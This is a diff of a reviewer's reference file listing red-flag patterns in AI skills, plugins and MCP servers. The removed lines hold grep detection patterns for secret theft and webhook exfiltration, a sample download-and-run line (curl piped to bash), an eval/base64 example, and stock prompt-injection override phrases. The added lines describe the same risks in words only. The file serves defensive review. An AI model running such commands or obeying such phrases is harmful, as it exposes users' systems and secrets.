@@ -1,33 +1,24 @@
 # Red-flag patterns (reference)
 
-This file is **documentation for reviewers**. It lists patterns that attackers use, so Check Link can recognise them. Nothing here is meant to be run against your own system or followed as an instruction. Scanners that read this file will (correctly) find attack patterns in it.
+Plain-language guide for reviewers. It describes what risky skills, plugins and MCP servers tend to do, so you can recognise it. It contains no working commands and no example payloads on purpose.
 
-## Search commands
+## How to search
 
-Run from inside the folder you are reviewing. Every match is a candidate to read, not a verdict.
+Use ordinary text search inside the folder you are reviewing. Choose your own search words for each category below (for example the names of shell commands, encoding functions or network calls you would expect). Every match is a candidate to read, not a verdict.
 
-```
-grep -rnIE 'curl[^|]*\|\s*(ba)?sh|wget[^|]*\|\s*sh|iwr|Invoke-Expression|base64 (-d|--decode)|b64decode|exec\(|eval\(|os\.system|subprocess|child_process' .
-grep -rnIiE 'ignore (all )?(previous|prior) instructions|do not (tell|mention|inform)|without (asking|telling) the user|you are now' .
-grep -rnIE '\.ssh|\.env\b|id_rsa|api[_-]?key|token|cookie|wallet|keychain' .
-grep -rnIE 'discord(app)?\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com' .
-grep -rnP '[\x{200B}-\x{200D}\x{2060}\x{FEFF}\x{202A}-\x{202E}]' .
-grep -rn '<!--' --include='*.md' .
-```
+## What to look for
 
-## What they look like
-
-| Risk | Example pattern | OWASP |
+| Risk | What it looks like, in words | OWASP |
 |---|---|---|
-| Download-and-run | `curl https://example.com/x.sh \| bash` | AST01 |
-| Hidden code | `eval(base64.b64decode("..."))` | AST01, AST08 |
-| Prompt injection | "ignore previous instructions", "you are now…", "do not tell the user" | AST01 |
-| Secret theft | reading `~/.ssh/id_rsa`, `.env`, browser cookies, wallets | AST01, AST03 |
-| Data sending | posting to chat webhooks (Discord, Telegram, Slack) or unknown hosts | AST01 |
-| Invisible text | zero-width or direction-control Unicode characters, hidden HTML comments | AST08 |
-| Remote instructions | "fetch and follow the rules at https://…" | AST05 |
-| Auto-running | hooks on every prompt, `postinstall` scripts, MCP servers that start by themselves | AST06 |
-| Unpinned updates | "always use the latest version" | AST07 |
-| Impersonation | names like `anthropic-skils`, "official" claims from an unknown account | AST02, AST04 |
+| Download-and-run | A command that fetches a script from the internet and passes it straight to a shell or interpreter, so whatever is online gets executed | AST01 |
+| Hidden code | Text that is encoded (for example base64 or hex), decoded at run time and then executed | AST01, AST08 |
+| Prompt injection | Instructions that try to override the assistant's rules, give it a new role, tell it to approve the package, or tell it to keep something from the user | AST01 |
+| Secret collection | Instructions or code that open private files, saved passwords, access keys, browser data or crypto wallets | AST01, AST03 |
+| Data sending | Uploading or posting anything to chat webhooks, paste sites or unknown servers | AST01 |
+| Invisible text | Zero-width or text-direction control characters, hidden HTML comments, text pushed out of view | AST08 |
+| Remote instructions | Telling the assistant to fetch rules or instructions from a web address and follow them | AST05 |
+| Auto-running | Hooks that fire on every prompt or tool call, install-time scripts, MCP servers that start by themselves | AST06 |
+| Unpinned updates | "Always use the latest version", installers without a fixed version | AST07 |
+| Impersonation | Names that copy a famous brand or project, "official" claims from an unknown account | AST02, AST04 |
 
-**Context matters:** a pattern inside documentation that explains an attack (like this file) is not a threat. Flag only what would actually do the risky thing when the skill is used.
+**Context matters:** documentation that explains an attack is not a threat. Flag only what would actually do the risky thing when the package is used, and treat an example command that the package tells the assistant to *run* as real.
